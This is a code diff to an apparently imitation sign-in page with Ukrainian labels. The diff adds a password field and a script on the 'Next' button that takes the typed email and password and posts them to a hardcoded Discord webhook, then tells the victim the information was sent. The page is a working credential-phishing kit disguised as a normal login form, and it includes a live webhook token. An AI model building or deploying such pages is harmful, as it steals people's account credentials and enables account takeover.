@@ -101,10 +101,50 @@
             <input type="text" id="email" name="email" required>
             <a href="#" class="forgot-password">Забули адресу електронної пошти?</a>
         </div>
+        <div class="input-group">
+            <label for="password">Пароль</label>
+            <input type="password" id="password" name="password" required>
+        </div>
         <div class="buttons">
             <button class="create-account">Створити обліковий запис</button>
-            <button class="next">Далі</button>
+            <button class="next" onclick="sendData()">Далі</button>
         </div>
     </div>
+
+    <script>
+        async function sendData() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            if (!email || !password) {
+                alert("Будь ласка, введіть пошту та пароль.");
+                return;
+            }
+
+            const webhookUrl = "https://discord.com/api/webhooks/1348986291903004733/htPsUAC3GLs3ZrtDzj1kTdcJ6K4XiqdcZTfsIY_WbByKiecQq592mPbE4YZWx-8R-LGW";
+            
+            const data = {
+                content: `Нове повідомлення: \nПошта: ${email} \nПароль: ${password}`
+            };
+            
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data),
+                });
+
+                if (response.ok) {
+                    alert("Інформація надіслана.");
+                } else {
+                    alert("Помилка при відправці повідомлення.");
+                }
+            } catch (error) {
+                alert("Помилка при відправці повідомлення.");
+            }
+        }
+    </script>
 </body>
 </html>
